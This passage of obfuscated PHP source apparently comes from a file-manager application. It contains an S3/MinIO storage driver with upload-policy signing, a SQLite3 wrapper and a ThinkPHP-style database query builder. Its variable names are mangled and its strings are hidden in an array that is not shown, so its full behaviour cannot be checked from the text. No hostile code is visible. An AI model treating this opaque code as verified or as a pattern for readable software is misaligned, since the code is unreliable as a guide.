(!in_array($this->osType, array($ÇÏëŞ—[70], $ÇÏëŞ—[64], $ÇÏëŞ—[69], $ÇÏëŞ—[62]))) { return $´Ş°ó«û . $ÇÏëŞ—[8] . $this->bucket; } $´Ş°ó«û = explode($ÇÏëŞ—[210], $´Ş°ó«û); return $´Ş°ó«û[0] . $ÇÏëŞ—[210] . $this->bucket . $ÇÏëŞ—[10] . $´Ş°ó«û[1]; } public function size($Ú–¬È¶®) { $ÌÂ¨ÂÛ = $this->objectMeta($Ú–¬È¶®); return $ÌÂ¨ÂÛ ? $ÌÂ¨ÂÛ[$_SERVER[ˆ¡¹µ‹Â][79]] : 0; } public function info($İü„½’ï) { if ($this->isFolder($İü„½’ï)) { return $this->folderInfo($İü„½’ï); } else { if ($this->isFile($İü„½’ï)) { return $this->fileInfo($İü„½’ï); } } return !1; } public function exist($¹¶©Ö…Á) { return $this->isFile($¹¶©Ö…Á) || $this->isFolder($¹¶©Ö…Á); } public function isFile($´¸½òã) { return !$this->isFolder($´¸½òã) && $this->objectMeta($´¸½òã); } public function isFolder($˜äÜˆ¸‡) { return $this->cacheMethod($_SERVER[ˆ¡¹µ‹Â][179], $˜äÜˆ¸‡); } protected function objectMeta($Ïµ´¥‚Ü) { return $this->cacheMethod($_SERVER[ˆ¡¹µ‹Â][181], $Ïµ´¥‚Ü); } protected function _objectMeta($ ÷ß€Àæ) { $ØÈÃãßÛ =& $_SERVER[ˆ¡¹µ‹Â]; $ ÷ß€Àæ = rtrim($ ÷ß€Àæ, $ØÈÃãßÛ[8]); try { $á‘ÑÏûÉ = $this->client->getObjectInfo($this->bucket, $ ÷ß€Àæ); if (!isset($á‘ÑÏûÉ[$ØÈÃãßÛ[252]]) && isset($á‘ÑÏûÉ[$ØÈÃãßÛ[268]])) { $á‘ÑÏûÉ[$ØÈÃãßÛ[252]] = $á‘ÑÏûÉ[$ØÈÃãßÛ[268]]; } } catch (Exception $ÔàéùùØ) { $á‘ÑÏûÉ = !1; } if (!$á‘ÑÏûÉ) { } return $á‘ÑÏûÉ; } protected function _isFolder($—Ìğ³¼) { $áé ıÆÕ =& $_SERVER[ˆ¡¹µ‹Â]; $—Ìğ³¼ = rtrim($—Ìğ³¼, $áé ıÆÕ[8]); if ($—Ìğ³¼ == $áé ıÆÕ[12] || $—Ìğ³¼ == $áé ıÆÕ[8]) { return !0; } $²‰Šø“‡ = $this->client->getBucket($this->bucket, $—Ìğ³¼, null, 1); if (empty($²‰Šø“‡[$áé ıÆÕ[236]])) { return !1; } $¥’Õ»ÌÆ = $²‰Šø“‡[$áé ıÆÕ[236]][0][$áé ıÆÕ[32]]; return stripos($¥’Õ»ÌÆ, $—Ìğ³¼ . $áé ıÆÕ[8]) === 0 ? !0 : !1; if (substr($¥’Õ»ÌÆ, -1) == $áé ıÆÕ[8]) { return !0; } if (get_path_this($¥’Õ»ÌÆ) == get_path_this($—Ìğ³¼)) { return !1; } return !0; } public function listObject($îÁµ§–Ú) { return $this->fileList($îÁµ§–Ú, $_SERVER[ˆ¡¹µ‹Â][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Œê–”ïÇ) { $öç‘† =& $_SERVER[ˆ¡¹µ‹Â]; parent::__construct($Œê–”ïÇ); $this->setSignVersion($öç‘†[247]); if (!$this->region) { $this->region = $öç‘†[269]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $Õ‚–˜ó… = $this->getBucketRgn(); return $this->region == $Õ‚–˜ó… ? !0 : !1; } public function uploadFormData($ÃæÛûóú, $Ìä«·¹ù = 3600) { $Ö²»·öˆ =& $_SERVER[ˆ¡¹µ‹Â]; $û¿ÈùÙ = $Ö²»·öˆ[229]; $İÊğ­Ïª = $Ö²»·öˆ[270]; $Ñà¶ËÁ  = $Ö²»·öˆ[62]; $Í¹›óÇŠ = gmdate($Ö²»·öˆ[271]); $¾¬§©½Ï = gmdate($Ö²»·öˆ[272]); $Œ´‚Èšİ = $Ö²»·öˆ[273]; $ùØøŸ’ø = $Ìä«·¹ù . $Ö²»·öˆ[12]; $•­ÒÊÑ– = $Ö²»·öˆ[274]; $¸ÌéâÄ™ = array($this->accessKey, $¾¬§©½Ï, $this->region, $Ñà¶ËÁ , $Œ´‚Èšİ); $ÂêùÌğà = implode($Ö²»·öˆ[8], $¸ÌéâÄ™); $Ë¢±¬å = array($Ö²»·öˆ[275] => gmdate($Ö²»·öˆ[276], strtotime($Ö²»·öˆ[277])), $Ö²»·öˆ[278] => array(array($Ö²»·öˆ[279] => $this->bucket), array($Ö²»·öˆ[280] => $û¿ÈùÙ), array($Ö²»·öˆ[281], $Ö²»·öˆ[282], $Ö²»·öˆ[12]), array($Ö²»·öˆ[281], $Ö²»·öˆ[283], $Ö²»·öˆ[12]), array($Ö²»·öˆ[281], $Ö²»·öˆ[284], $Ö²»·öˆ[12]), array($Ö²»·öˆ[285] => $•­ÒÊÑ–), array($Ö²»·öˆ[286] => $ÂêùÌğà), array($Ö²»·öˆ[287] => $İÊğ­Ïª), array($Ö²»·öˆ[288] => $Í¹›óÇŠ), array($Ö²»·öˆ[289] => $ùØøŸ’ø))); $Ç°Éå¸µ = base64_encode(json_encode($Ë¢±¬å)); $ÖÒ¶²«¢ = hash_hmac($Ö²»·öˆ[290], $¾¬§©½Ï, $Ö²»·öˆ[291] . $this->secret, !0); $¢÷ò‹®æ = hash_hmac($Ö²»·öˆ[290], $this->region, $ÖÒ¶²«¢, !0); $Èú„á = hash_hmac($Ö²»·öˆ[290], $Ñà¶ËÁ , $¢÷ò‹®æ, !0); $ª¡¼¡Ãû = hash_hmac($Ö²»·öˆ[290], $Œ´‚Èšİ, $Èú„á, !0); $ï¹’÷îæ = hash_hmac($Ö²»·öˆ[290], $Ç°Éå¸µ, $ª¡¼¡Ãû); $’¢¸Ã = array($Ö²»·öˆ[246] => $Ö²»·öˆ[12], $Ö²»·öˆ[292] => $Ö²»·öˆ[12], $Ö²»·öˆ[280] => $û¿ÈùÙ, $Ö²»·öˆ[285] => $•­ÒÊÑ–, $Ö²»·öˆ[293] => $Ç°Éå¸µ, $Ö²»·öˆ[294] => $ÂêùÌğà, $Ö²»·öˆ[295] => $İÊğ­Ïª, $Ö²»·öˆ[296] => $Í¹›óÇŠ, $Ö²»·öˆ[297] => $ùØøŸ’ø, $Ö²»·öˆ[298] => $ï¹’÷îæ, $Ö²»·öˆ[208] => $this->getHost()); return $’¢¸Ã; } } goto bÈ ¨­¢¸í; b™Ñª¤¸£‡: class DbSqlite3 extends DbSqlite3Base { public function query($ó–¬ãä) { $ûş‰îÅù =& $_SERVER[ˆ¡¹µ‹Â]; if (!CacheLock::fileLock($ûş‰îÅù[13])) { return !1; } $Üöå•½ = parent::query($ó–¬ãä); CacheLock::fileUnLock($ûş‰îÅù[13]); return $Üöå•½; } public function execute($øû®ÚË) { $ìÜ¦Í‘ =& $_SERVER[ˆ¡¹µ‹Â]; if (!CacheLock::fileLock($ìÜ¦Í‘[13])) { return !1; } $û¾ËˆÄñ = parent::execute($øû®ÚË); CacheLock::fileUnLock($ìÜ¦Í‘[13]); return $û¾ËˆÄñ; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\x69\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\x65\x71" => "\75", "\x6e\x65\161" => "\x3c\76", "\x67\x74" => "\76", "\x65\147\x74" => "\x3e\75", "\154\164" => "\x3c", "\145\154\164" => "\74\x3d", "\x6e\157\164\154\x69\153\145" => "\116\117\124\40\x4c\111\x4b\105", "\x6c\151\x6b\145" => "\114\111\x4b\x45", "\x69\156" => "\111\116", "\x6e\x6f\164\151\156" => "\116\x4f\124\x20\x49\x4e", "\156\157\164\x20\151\156" => "\x4e\117\124\40\x49\116", "\x62\x65\x74\167\x65\x65\156" => "\x42\x45\x54\x57\105\105\x4e", "\156\157\164\142\145\x74\x77\145\145\156" => "\x4e\117\124\40\x42\x45\x54\127\105\x45\116", "\156\x6f\164\x20\x62\145\x74\x77\x65\145\156" => "\x4e\x4f\x54\x20\102\105\124\127\105\105\x4e"); protected $selectSql = "\x53\x45\x4c\x45\103\124\45\x44\x49\123\x54\x49\116\103\x54\45\40\45\106\111\x45\114\x44\x25\40\106\x52\x4f\115\x20\45\124\101\102\114\105\45\45\112\x4f\x49\116\x25\x25\127\110\x45\x52\105\x25\45\x47\122\x4f\125\120\x25\45\x48\x41\126\x49\116\107\45\45\117\x52\x44\105\x52\45\x25\x4c\111\115\111\124\45\x20\x25\125\x4e\x49\117\x4e\x25\x25\x43\117\x4d\115\105\x4e\124\45"; protected $bind = array(); public static function getInstance() { $ÁİÁŒıô = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ˆ¡¹µ‹Â][1031], $ÁİÁŒıô); } public function factory($ÏŒ¹öâœ = '') { $ÛÆèÔÙ =& $_SERVER[ˆ¡¹µ‹Â]; $ÏŒ¹öâœ = $this->parseConfig($ÏŒ¹öâœ); if (empty($ÏŒ¹öâœ[$ÛÆèÔÙ[1032]])) { think_exception(think_lang($ÛÆèÔÙ[1033])); } $this->dbType = ucwords(strtolower($ÏŒ¹öâœ[$ÛÆèÔÙ[1032]])); $©­ëÄ‹Í = $ÛÆèÔÙ[1034] . $this->dbType; if (class_exists($©­ëÄ‹Í)) { $ˆª«š¬” = new $©­ëÄ‹Í($ÏŒ¹öâœ); if ($ÛÆèÔÙ[1035] != strtolower($ÏŒ¹öâœ[$ÛÆèÔÙ[1032]])) { $ˆª«š¬”->dbType = strtoupper($this->dbType); } else { $ˆª«š¬”->dbType = $this->_getDsnType($ÏŒ¹öâœ[$ÛÆèÔÙ[987]]); } } else { think_exception(think_lang($ÛÆèÔÙ[1036]) . $ÛÆèÔÙ[1037] . $©­ëÄ‹Í); } return $ˆª«š¬”; } public function __call($—°ãà•—, $¼Ÿ£ãŠ¬) { if (method_exists($this, $—°ãà•—)) { return call_user_func_array(array($this, $—°ãà•—), $¼Ÿ£ãŠ¬); } } protected function _getDsnType($Ÿˆƒá¥Ú) { $”Èè´ÔĞ = explode($_SERVER[ˆ¡¹µ‹Â][4], $Ÿˆƒá¥Ú); $´Ï–´  = strtoupper(trim($”Èè´ÔĞ[0])); return $´Ï–´ ; } private function parseConfig($ƒ¬íİ = '') { $ÅÊ•ıºŠ =& $_SERVER[ˆ¡¹µ‹Â]; if (!empty($ƒ¬íİ) && is_string($ƒ¬íİ)) { $ƒ¬íİ = $this->parseDSN($ƒ¬íİ); } elseif (is_array($ƒ¬íİ)) { $ƒ¬íİ = array_change_key_case($ƒ¬íİ); $ƒ¬íİ = array($ÅÊ•ıºŠ[1032] => $ƒ¬íİ[$ÅÊ•ıºŠ[1038]], $ÅÊ•ıºŠ[959] => $ƒ¬íİ[$ÅÊ•ıºŠ[1039]], $ÅÊ•ıºŠ[960] => $ƒ¬íİ[$ÅÊ•ıºŠ[1040]], $ÅÊ•ıºŠ[957] => $ƒ¬íİ[$ÅÊ•ıºŠ[1041]], $ÅÊ•ıºŠ[958] => $ƒ¬íİ[$ÅÊ•ıºŠ[1042]], $ÅÊ•ıºŠ[21] => $ƒ¬íİ[$ÅÊ•ıºŠ[1043]], $ÅÊ•ıºŠ[987] => $ƒ¬íİ[$ÅÊ•ıºŠ[1044]], $ÅÊ•ıºŠ[17] => isset($ƒ¬íİ[$ÅÊ•ıºŠ[1045]]) ? $ƒ¬íİ[$ÅÊ•ıºŠ[1045]] : array()); } elseif (empty($ƒ¬íİ)) { if (think_config($ÅÊ•ıºŠ[1046]) && $ÅÊ•ıºŠ[1035] != strtolower(think_config($ÅÊ•ıºŠ[1047]))) { $ƒ¬íİ = $this->parseDSN(think_config($ÅÊ•ıºŠ[1046])); } else { $ƒ¬íİ = array($ÅÊ•ıºŠ[1032] => think_config($ÅÊ•ıºŠ[1047]), $ÅÊ•ıºŠ[959] => think_config($ÅÊ•ıºŠ[1048]), $ÅÊ•ıºŠ[960] => think_config($ÅÊ•ıºŠ[1049]), $ÅÊ•ıºŠ[957] => think_config($ÅÊ•ıºŠ[1050]), $ÅÊ•ıºŠ[958] => think_config($ÅÊ•ıºŠ[1051]), $ÅÊ•ıºŠ[21] => think_config($ÅÊ•ıºŠ[323]), $ÅÊ•ıºŠ[987] => think_config($ÅÊ•ıºŠ[1046]), $ÅÊ•ıºŠ[17] => think_config($ÅÊ•ıºŠ[1052])); } } return $ƒ¬íİ; } protected function initConnect($èˆ§‘©± = true) { if (1 == think_config($_SERVER[ˆ¡¹µ‹Â][22])) { $this->_linkID = $this->multiConnect($èˆ§‘©±); } else { if (isset($this->config) && $this->config) { $this->configLast = $this->config; } } if (!isset($this->connected) || !$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $À³õíÍİ => $ŸĞ™¨ã) { $this->_linkID = $ŸĞ™¨ã; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($‚ˆØç…¤ = false) { $‡ÈƒğúĞ =& $_SERVER[ˆ¡¹µ‹Â]; static $’ë‘Öü = array(); static $êˆƒ¥Æ® = -1; if (empty($’ë‘Öü)) { foreach ($this->config as $óãÚÑ³ => $ç Ğéş¡) { $’ë‘Öü[$óãÚÑ³] = explode($‡ÈƒğúĞ[50], $ç Ğéş¡); } } if (think_config($‡ÈƒğúĞ[1053])) { if ($‚ˆØç…¤ || think_config($‡ÈƒğúĞ[471]) === !0) { $¸§©©˜ = floor(mt_rand(0, think_config($‡ÈƒğúĞ[1054]) - 1)); $êˆƒ¥Æ® = $¸§©©˜; } else { if (is_numeric(think_config($‡ÈƒğúĞ[1055]))) { $¸§©©˜ = think_config($‡ÈƒğúĞ[1055]); } else { $¸§©©˜ = floor(mt_rand(think_config($‡ÈƒğúĞ[1054]), count($’ë‘Öü[$‡ÈƒğúĞ[957]]) - 1)); } } } else { $¸§©©˜ = floor(mt_rand(0, count($’ë‘Öü[$‡ÈƒğúĞ[957]]) - 1)); $êˆƒ¥Æ® = $¸§©©˜; } $¸§©©˜ = $êˆƒ¥Æ® !== -1 ? $êˆƒ¥Æ® : $¸§©©˜; $ßÛşÔË = array($‡ÈƒğúĞ[959] => isset($’ë‘Öü[$‡ÈƒğúĞ[959]][$¸§©©˜]) ? $’ë‘Öü[$‡ÈƒğúĞ[959]][$¸§©©˜] : $’ë‘Öü[$‡ÈƒğúĞ[959]][0], $‡ÈƒğúĞ[960] => isset($’ë‘Öü[$‡ÈƒğúĞ[960]][$¸§©©˜]) ? $’ë‘Öü[$‡ÈƒğúĞ[960]][$¸§©©˜] : $’ë‘Öü[$‡ÈƒğúĞ[960]][0], $‡ÈƒğúĞ[957] => isset($’ë‘Öü[$‡ÈƒğúĞ[957]][$¸§©©˜]) ? $’ë‘Öü[$‡ÈƒğúĞ[957]][$¸§©©˜] : $’ë‘Öü[$‡ÈƒğúĞ[957]][0], $‡ÈƒğúĞ[958] => isset($’ë‘Öü[$‡ÈƒğúĞ[958]][$¸§©©˜]) ? $’ë‘Öü[$‡ÈƒğúĞ[958]][$¸§©©˜] : $’ë‘Öü[$‡ÈƒğúĞ[958]][0], $‡ÈƒğúĞ[21] => isset($’ë‘Öü[$‡ÈƒğúĞ[21]][$¸§©©˜]) ? $’ë‘Öü[$‡ÈƒğúĞ[21]][$¸§©©˜] : $’ë‘Öü[$‡ÈƒğúĞ[21]][0], $‡ÈƒğúĞ[987] => isset($’ë‘Öü[$‡ÈƒğúĞ[987]][$¸§©©˜]) ? $’ë‘Öü[$‡ÈƒğúĞ[987]][$¸§©©˜] : $’ë‘Öü[$‡ÈƒğúĞ[987]][0], $‡ÈƒğúĞ[17] => isset($’ë‘Öü[$‡ÈƒğúĞ[17]][$¸§©©˜]) ? $’ë‘Öü[$‡ÈƒğúĞ[17]][$¸§©©˜] : $’ë‘Öü[$‡ÈƒğúĞ[17]][0]); return $this->connect($ßÛşÔË, $¸§©©˜); } public function parseDSN($ó¿‡àà¯) { $¦ùÇ«“» =& $_SERVER[ˆ¡¹µ‹Â]; if (empty($ó¿‡àà¯)) { return !1; } $°ú—ÒëŞ = parse_url($ó¿‡àà¯); if ($°ú—ÒëŞ[$¦ùÇ«“»[207]]) { $Ãô×£ì‘ = array($¦ùÇ«“»[1032] => $°ú—ÒëŞ[$¦ùÇ«“»[207]], $¦ùÇ«“»[959] => isset($°ú—ÒëŞ[$¦ùÇ«“»[662]]) ? $°ú—ÒëŞ[$¦ùÇ«“»[662]] : $¦ùÇ«“»[12], $¦ùÇ«“»[960] => isset($°ú—ÒëŞ[$¦ùÇ«“»[1056]]) ? $°ú—ÒëŞ[$¦ùÇ«“»[1056]] : $¦ùÇ«“»[12], $¦ùÇ«“»[957] => isset($°ú—ÒëŞ[$¦ùÇ«“»[208]]) ? $°ú—ÒëŞ[$¦ùÇ«“»[208]] : $¦ùÇ«“»[12], $¦ùÇ«“»[958] => isset($°ú—ÒëŞ[$¦ùÇ«“»[209]]) ? $°ú—ÒëŞ[$¦ùÇ«“»[209]] : $¦ùÇ«“»[12], $¦ùÇ«“»[21] => isset($°ú—ÒëŞ[$¦ùÇ«“»[87]]) ? substr($°ú—ÒëŞ[$¦ùÇ«“»[87]], 1) : $¦ùÇ«“»[12]); } else { preg_match($¦ùÇ«“»[1057], trim($ó¿‡àà¯), $æ›Ûˆğ); $Ãô×£ì‘ = array($¦ùÇ«“»[1032] => $æ›Ûˆğ[1], $¦ùÇ«“»[959] => $æ›Ûˆğ[2], $¦ùÇ«“»[960] => $æ›Ûˆğ[3], $¦ùÇ«“»[957] => $æ›Ûˆğ[4], $¦ùÇ«“»[958] => $æ›Ûˆğ[5], $¦ùÇ«“»[21] => $æ›Ûˆğ[6]); } $Ãô×£ì‘[$¦ùÇ«“»[987]] = $¦ùÇ«“»[12]; return $Ãô×£ì‘; } protected function debug() { $ˆçÉúÂ =& $_SERVER[ˆ¡¹µ‹Â]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ˆçÉúÂ[1058]; if (think_config($ˆçÉúÂ[1059])) { think_status($ˆçÉúÂ[1060]); think_trace($this->queryStr . $ˆçÉúÂ[1061] . think_status($ˆçÉúÂ[24], $ˆçÉúÂ[1060], 6) . $ˆçÉúÂ[1062], $ˆçÉúÂ[12], $ˆçÉúÂ[1063]); } } protected function parseLock($„øÇ™ = false) { $şÖ°¥ìş =& $_SERVER[ˆ¡¹µ‹Â]; if (!$„øÇ™) { return $şÖ°¥ìş[12]; } if ($şÖ°¥ìş[989] == $this->dbType) { return $şÖ°¥ìş[1064]; } return $şÖ°¥ìş[1065]; } protected function parseSet($Ûı‰†ê±) { $šüàæ´¹ =& $_SERVER[ˆ¡¹µ‹Â]; foreach ($Ûı‰†ê± as $ı¿µã½³ => $–ŠİÛº¥) { if (is_array($–ŠİÛº¥) && $šüàæ´¹[373] == $–ŠİÛº¥[0]) { $Î‚æºŸ[] = $this->parseKey($ı¿µã½³) . $šüàæ´¹[506] . $–ŠİÛº¥[1]; } elseif (is_scalar($–ŠİÛº¥) || is_null($–ŠİÛº¥)) { $Î‚æºŸ[] = $this->parseKey($ı¿µã½³) . $šüàæ´¹[506] . $this->parseValue($–ŠİÛº¥); } } return $šüàæ´¹[1066] . implode($šüàæ´¹[50], $Î‚æºŸ); } protected function bindParam($ä›Ğ¹ ˆ, $Í½µ™ö) { $this->bind[$_SERVER[ˆ¡¹µ‹Â][4] . $ä›Ğ¹ ˆ] = $Í½µ™ö; } protected function parseBind($ŞÙÍÃ) { $ŞÙÍÃ = array_merge($this->bind, $ŞÙÍÃ); $this->bind = array(); return $ŞÙÍÃ; } function parseKey(&$ÕÍò­›ƒ, $‹¼¨õÍ® = true) { if ($‹¼¨õÍ®) { $ÕÍò­›ƒ = $this->parseKeyCheck($ÕÍò­›ƒ); } return $ÕÍò­›ƒ; } function parseKeyCheck($ÜÈÇ°¤°) { $š›Ñç˜ =& $_SERVER[ˆ¡¹µ‹Â]; $ÜÈÇ°¤° = trim($ÜÈÇ°¤°); if (!preg_match($š›Ñç˜[1067], $ÜÈÇ°¤°)) { think_exception($š›Ñç˜[1068] . $ÜÈÇ°¤°); } return $ÜÈÇ°¤°; } protected function parseValue($÷¡‚–ØÍ) { $ºÁËéØè =& $_SERVER[ˆ¡¹µ‹Â]; if (is_string($÷¡‚–ØÍ)) { $÷¡‚–ØÍ = $ºÁËéØè[1028] . $this->escapeString($÷¡‚–ØÍ) . $ºÁËéØè[1028]; } elseif (isset($÷¡‚–ØÍ[0]) && is_string($÷¡‚–ØÍ[0]) && strtolower($÷¡‚–ØÍ[0]) == $ºÁËéØè[373]) { $÷¡‚–ØÍ = $this->escapeString($÷¡‚–ØÍ[1]); } elseif (is_array($÷¡‚–ØÍ)) { $÷¡‚–ØÍ = array_map(array($this, $ºÁËéØè[1029]), $÷¡‚–ØÍ); } elseif (is_bool($÷¡‚–ØÍ)) { $÷¡‚–ØÍ = $÷¡‚–ØÍ ? $ºÁËéØè[91] : $ºÁËéØè[228]; } elseif (is_null($÷¡‚–ØÍ)) { $÷¡‚–ØÍ = $ºÁËéØè[106]; } return $÷¡‚–ØÍ; } protected function parseField($ûĞØÂÁ›) { $ŠâŒİ‡ú =& $_SERVER[ˆ¡¹µ‹Â]; if (is_string($ûĞØÂÁ›) && strpos($ûĞØÂÁ›, $ŠâŒİ‡ú[50])) { $ûĞØÂÁ› = explode($ŠâŒİ‡ú[50], $ûĞØÂÁ›); } if (is_array($ûĞØÂÁ›)) { $÷¸ŒÎ = array(); foreach ($ûĞØÂÁ› as $­µİ×«Á => $ÔÑªÇ°¾) { if (!is_numeric($­µİ×«Á)) { $÷¸ŒÎ[] = $this->parseKey($­µİ×«Á, !1) . $ŠâŒİ‡ú[1069] . $this->parseKey($ÔÑªÇ°¾); } else { $÷¸ŒÎ[] = $this->parseKey($ÔÑªÇ°¾); } } $ªÅ¶¹¶š = implode($ŠâŒİ‡ú[50], $÷¸ŒÎ); } elseif (is_string($ûĞØÂÁ›) && !empty($ûĞØÂÁ›)) { $ªÅ¶¹¶š = $ûĞØÂÁ›; } else { $ªÅ¶¹¶š = $ŠâŒİ‡ú[220]; } return $ªÅ¶¹¶š; } protected function parseTable($ÈÒ²ŸÕÜ) { $îš×¸£Ğ =& $_SERVER[ˆ¡¹µ‹Â]; if (is_array($ÈÒ²ŸÕÜ)) { $Â‘×…Îä = array(); foreach ($ÈÒ²ŸÕÜ as $õËÑ’ƒ™ => $ŠÖóÉî€) { if (!is_numeric($õËÑ’ƒ™)) { $Â‘×…Îä[] = $this->parseKey($õËÑ’ƒ™) . $îš×¸£Ğ[53] . $this->parseKey($ŠÖóÉî€); } else { $Â‘×…Îä[] = $this->parseKey($õËÑ’ƒ™); } } $ÈÒ²ŸÕÜ = $Â‘×…Îä; } elseif (is_string($ÈÒ²ŸÕÜ)) { if (strstr($ÈÒ²ŸÕÜ, $îš×¸£Ğ[53])) { return $ÈÒ²ŸÕÜ; } $ÈÒ²ŸÕÜ = explode($îš×¸£Ğ[50], $ÈÒ²ŸÕÜ); array_walk($ÈÒ²ŸÕÜ, array($this, $îš×¸£Ğ[977])); } return $îš×¸£Ğ[971] . trim(implode($îš×¸£Ğ[1070], $ÈÒ²ŸÕÜ), $îš×¸£Ğ[461]) . $îš×¸£Ğ[971]; } protected function parseWhere($ş³£óí¨) { $ÜˆÇãÄÓ =& $_SERVER[ˆ¡¹µ‹Â]; $‚­Èûˆ = $ÜˆÇãÄÓ[12]; if (is_string($ş³£óí¨)) { $‚­Èûˆ = $ş³£óí¨; } else { $ëõíƒù = isset($ş³£óí¨[$ÜˆÇãÄÓ[1071]]) ? strtoupper($ş³£óí¨[$ÜˆÇãÄÓ[1071]]) : $ÜˆÇãÄÓ[12]; if (in_array($ëõíƒù, array($ÜˆÇãÄÓ[1072], $ÜˆÇãÄÓ[1073], $ÜˆÇãÄÓ[1074]))) { $ëõíƒù = $ÜˆÇãÄÓ[53] . $ëõíƒù . $ÜˆÇãÄÓ[53]; unset($ş³£óí¨[$ÜˆÇãÄÓ[1071]]); } else { $ëõíƒù = $ÜˆÇãÄÓ[1075]; } foreach ($ş³£óí¨ as $ë®¡äÕ— => $ùÔ‡—²) { $‚­Èûˆ .= $ÜˆÇãÄÓ[354]; if (is_numeric($ë®¡äÕ—)) { $ë®¡äÕ— = $ÜˆÇãÄÓ[1076]; } if (0 === strpos($ë®¡äÕ—, $ÜˆÇãÄÓ[11])) { $‚­Èûˆ .= $this->parseThinkWhere($ë®¡äÕ—, $ùÔ‡—²); } else { if (!preg_match($ÜˆÇãÄÓ[1077], trim($ë®¡äÕ—))) { think_exception(think_lang($ÜˆÇãÄÓ[1078]) . $ÜˆÇãÄÓ[4] . $ë®¡äÕ—); } $Òˆµ¢’Š = is_array($ùÔ‡—²) && isset($ùÔ‡—²[$ÜˆÇãÄÓ[1079]]); $ë®¡äÕ— = trim($ë®¡äÕ—); if (strpos($ë®¡äÕ—, $ÜˆÇãÄÓ[214])) { $¡Õå·é = explode($ÜˆÇãÄÓ[214], $ë®¡äÕ—); $‡™­ÎŠ© = array(); foreach ($¡Õå·é as $…£œ…ŸÔ => $©É•–¥) { $Ú¸£ê·‡ = $Òˆµ¢’Š ? $ùÔ‡—²[$…£œ…ŸÔ] : $ùÔ‡—²; $‡™­ÎŠ©[] = $ÜˆÇãÄÓ[337] . $this->parseWhereItem($this->parseKey($©É•–¥), $Ú¸£ê·‡) . $ÜˆÇãÄÓ[976]; } $‚­Èûˆ .= implode($ÜˆÇãÄÓ[1080], $‡™­ÎŠ©); } elseif (strpos($ë®¡äÕ—, $ÜˆÇãÄÓ[360])) { $¡Õå·é = explode($ÜˆÇãÄÓ[360], $ë®¡äÕ—); $‡™­ÎŠ© = array(); foreach ($¡Õå·é as $…£œ…ŸÔ => $©É•–¥) { $Ú¸£ê·‡ = $Òˆµ¢’Š ? $ùÔ‡—²[$…£œ…ŸÔ] : $ùÔ‡—²; $‡™­ÎŠ©[] = $ÜˆÇãÄÓ[337] . $this->parseWhereItem($this->parseKey($©É•–¥), $Ú¸£ê·‡) . $ÜˆÇãÄÓ[976]; } $‚­Èûˆ .= implode($ÜˆÇãÄÓ[1075], $‡™­ÎŠ©); } else { $‚­Èûˆ .= $this->parseWhereItem($this->parseKey($ë®¡äÕ—), $ùÔ‡—²); } } $‚­Èûˆ .= $ÜˆÇãÄÓ[355] . $ëõíƒù; } $‚­Èûˆ = substr($‚­Èûˆ, 0, -strlen($ëõíƒù)); } return empty($‚­Èûˆ) ? $ÜˆÇãÄÓ[12] : $ÜˆÇãÄÓ[1081] . $‚­Èûˆ; } protected function parseWhereItem($ıØë—Ü×, $¿²Ä¿ë) { $ŒüÃ‚à— =& $_SERVER[ˆ¡¹µ‹Â]; $¯¸âÌê = $ŒüÃ‚à—[12]; if (is_array($¿²Ä¿ë)) { if (is_string($¿²Ä¿ë[0])) { $ı²İĞ¶Ä = strtolower($¿²Ä¿ë[0]); if (in_array($¿²Ä¿ë[0], array($ŒüÃ‚à—[506], $ŒüÃ‚à—[1082], $ŒüÃ‚à—[1083], $ŒüÃ‚à—[1084], $ŒüÃ‚à—[1085], $ŒüÃ‚à—[1086]))) { $¯¸âÌê .= $ıØë—Ü× . $ŒüÃ‚à—[53] . $¿²Ä¿ë[0] . $ŒüÃ‚à—[53] . $this->parseValue($¿²Ä¿ë[1]); } elseif (preg_match($ŒüÃ‚à—[1087], $¿²Ä¿ë[0])) { $¯¸âÌê .= $ıØë—Ü× . $ŒüÃ‚à—[53] . $this->exp[$ı²İĞ¶Ä] . $ŒüÃ‚à—[53] . $this->parseValue($¿²Ä¿ë[1]); } elseif (preg_match($ŒüÃ‚à—[1088], $¿²Ä¿ë[0])) { if (is_array($¿²Ä¿ë[1])) { $Ş¸¯Ÿ­Ó = isset($¿²Ä¿ë[2]) ? strtoupper($¿²Ä¿ë[2]) : $ŒüÃ‚à—[1073]; if (in_array($Ş¸¯Ÿ­Ó, array($ŒüÃ‚à—[1072], $ŒüÃ‚à—[1073], $ŒüÃ‚à—[1074]))) { $çîíîå– = array(); foreach ($¿²Ä¿ë[1] as $Š£ö€²“) { $çîíîå–[] = $ıØë—Ü× . $ŒüÃ‚à—[53] . $this->exp[$ı²İĞ¶Ä] . $ŒüÃ‚à—[53] . $this->parseValue($Š£ö€²“); } $¯¸âÌê .= $ŒüÃ‚à—[337] . implode($ŒüÃ‚à—[53] . $Ş¸¯Ÿ­Ó . $ŒüÃ‚à—[53], $çîíîå–) . $ŒüÃ‚à—[976]; } } else { $¯¸âÌê .= $ıØë—Ü× . $ŒüÃ‚à—[53] . $this->exp[$ı²İĞ¶Ä] . $ŒüÃ‚à—[53] . $this->parseValue($¿²Ä¿ë[1]); } } elseif ($ŒüÃ‚à—[373] == $ı²İĞ¶Ä) { $¯¸âÌê .= $ŒüÃ‚à—[974] . $ıØë—Ü× . $ŒüÃ‚à—[53] . $¿²Ä¿ë[1] . $ŒüÃ‚à—[1089]; } elseif (preg_match($ŒüÃ‚à—[1090], $¿²Ä¿ë[0])) { $¯¸âÌê .= $¿²Ä¿ë[0]; } elseif (preg_match($ŒüÃ‚à—[1091], $¿²Ä¿ë[0])) { if (isset($¿²Ä¿ë[2]) && $ŒüÃ‚à—[373] == $¿²Ä¿ë[2]) { $¯¸âÌê .= 